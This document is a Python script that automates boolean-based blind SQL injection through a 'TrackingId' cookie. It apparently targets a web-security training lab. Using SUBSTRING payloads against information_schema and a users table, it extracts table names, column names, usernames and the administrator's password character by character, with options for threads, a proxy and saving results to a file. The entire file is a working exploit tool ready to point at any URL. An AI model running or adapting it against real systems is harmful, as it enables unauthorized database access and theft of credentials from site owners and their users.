import argparse
import requests
import json
import time
import sys
import logging
import signal
from concurrent.futures import ThreadPoolExecutor, TimeoutError
from colorama import Fore, Style, init

# Initialize colorama for cross-platform support
init(autoreset=True)

# Configure logging for better debugging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global flag to control interrupt status
interrupted = False

def handle_interrupt(signum, frame):
    """Handle SIGINT for graceful shutdown on KeyboardInterrupt."""
    global interrupted
    interrupted = True

# Register the interrupt signal handler
signal.signal(signal.SIGINT, handle_interrupt)

def load_config(file_path):
    """Load configuration from a JSON file."""
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Failed to load configuration: {e}" + Style.RESET_ALL)
        sys.exit(1)

def test_char_at_position(url, cookies, headers, position, char, success_condition, verbose=False, search_type="password", offset=0):
    """Test if a specific character at a specific position matches the target."""
    if search_type == "column":
        payload = f"'AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
    elif search_type == "table":
        payload = f"'AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
    elif search_type == "username":
        payload = f"'AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
    else:  # Default to password search
        payload = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char}"
    
    cookies["TrackingId"] += payload
    response = requests.get(url, headers=headers, cookies=cookies)

    if verbose and not interrupted:
        print(Fore.YELLOW + f"Testing position {position} with character '{char}'... Response length: {len(response.text)}" + Style.RESET_ALL)

    return success_condition in response.text

def extract_data(config, charset, length, verbose, delay, output_file, success_condition, max_threads, proxy, search_type):
    """Extract data character by character using the specified search type."""
    url = config["url"]
    cookies = config["cookies"]
    headers = config["headers"]
    proxies = {"http": proxy, "https": proxy} if proxy else None

    all_data = []  # Store each full result (e.g., each column name)
    offset = 0  # Offset to paginate through items (e.g., columns, tables)
    timeout_limit = 5  # Number of consecutive timeouts before concluding end of item
    consecutive_timeouts = 0  # Counter for consecutive timeouts

    while not interrupted:
        extracted_item = ""
        position = 1  # Reset position for each new item

        def test_position(position):
            """Test each character at a given position until match is found or interrupted."""
            nonlocal extracted_item, consecutive_timeouts
            if interrupted:
                return None  # Exit if interrupted

            for char in charset:
                if test_char_at_position(url, cookies.copy(), headers, position, char, success_condition, verbose, search_type, offset):
                    extracted_item += char
                    consecutive_timeouts = 0  # Reset consecutive timeouts after finding a character
                    if not interrupted:
                        # Display character and progressively build the extracted item
                        print(Fore.GREEN + f"[+] Character found: {char} -> {extracted_item}" + Style.RESET_ALL)
                    return char
                if delay > 0 and not interrupted:
                    time.sleep(delay)
            consecutive_timeouts += 1
            return None

        # Use ThreadPoolExecutor to handle concurrent requests
        try:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                for position in range(1, length + 1):
                    if interrupted:
                        break  # Exit if interrupted
                    if consecutive_timeouts >= timeout_limit:
                        print(Fore.YELLOW + "End of item detected due to consecutive timeouts." + Style.RESET_ALL)
                        break
                    try:
                        result = executor.submit(test_position, position).result(timeout=10)  # Timeout of 10 seconds
                        if not result:
                            if extracted_item:  # Only add if we have some characters
                                all_data.append(extracted_item)
                                if not interrupted:
                                    print(Fore.GREEN + f"Extracted {search_type.capitalize()}: {extracted_item}" + Style.RESET_ALL)
                            break
                    except TimeoutError:
                        consecutive_timeouts += 1
                        if consecutive_timeouts >= timeout_limit:
                            print(Fore.YELLOW + "End of item detected due to consecutive timeouts." + Style.RESET_ALL)
                            break
                        if not interrupted:
                            print(Fore.YELLOW + f"Timeout at position {position}. Continuing with next position." + Style.RESET_ALL)
                        continue
        finally:
            if not interrupted:
                print(Fore.CYAN + "ThreadPoolExecutor closed." + Style.RESET_ALL)

        # Increment offset to move to the next item (e.g., next column name) and reset timeout counter
        if extracted_item:
            all_data.append(extracted_item)
        offset += 1
        consecutive_timeouts = 0

    # Output the extracted data
    if not interrupted:
        data_type = search_type.capitalize() if search_type != "password" else "Password"
        print(Fore.GREEN + f"Extracted {data_type}s: {all_data}" + Style.RESET_ALL)

    if output_file and not interrupted:
        try:
            with open(output_file, 'w') as f:
                f.write(f"Extracted {data_type}s: {', '.join(all_data)}\n")
            print(Fore.GREEN + f"{data_type}s saved to {output_file}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Failed to write to output file: {e}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description="Automate blind SQL injection enumeration with customization options.")
    parser.add_argument('-f', '--file', required=True, help="Path to the JSON configuration file.")
    parser.add_argument('-c', '--charset', type=str, default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", help="Character set for brute-forcing (default: alphanumeric).")
    parser.add_argument('-l', '--length', type=int, default=20, help="Maximum length of the data to enumerate (default: 20).")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output.")
    parser.add_argument('-d', '--delay', type=float, default=0, help="Delay between requests in seconds (default: 0).")
    parser.add_argument('-o', '--output-file', type=str, help="File to save the extracted data (optional).")
    parser.add_argument('-s', '--success-condition', type=str, default="Welcome", help="Text to identify a successful response (default: 'Welcome').")
    parser.add_argument('-t', '--threads', type=int, default=1, help="Number of concurrent threads to use (default: 1).")
    parser.add_argument('-p', '--proxy', type=str, help="Proxy URL (optional).")

    # New flags to specify the type of search
    parser.add_argument('-T', '--table', action='store_true', help="Search for table names.")
    parser.add_argument('-C', '--column', action='store_true', help="Search for column names.")
    parser.add_argument('-U', '--username', action='store_true', help="Search for usernames.")

    args = parser.parse_args()

    # Determine search type based on flags
    search_type = "password"
    if args.table:
        search_type = "table"
    elif args.column:
        search_type = "column"
    elif args.username:
        search_type = "username"

    # Load configuration
    config = load_config(args.file)

    # Start the data extraction process
    extract_data(
        config=config,
        charset=args.charset,
        length=args.length,
        verbose=args.verbose,
        delay=args.delay,
        output_file=args.output_file,
        success_condition=args.success_condition,
        max_threads=args.threads,
        proxy=args.proxy,
        search_type=search_type
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if not interrupted:
            print(Fore.CYAN + "\nProgram interrupted by user." + Style.RESET_ALL)
        sys.exit(0)
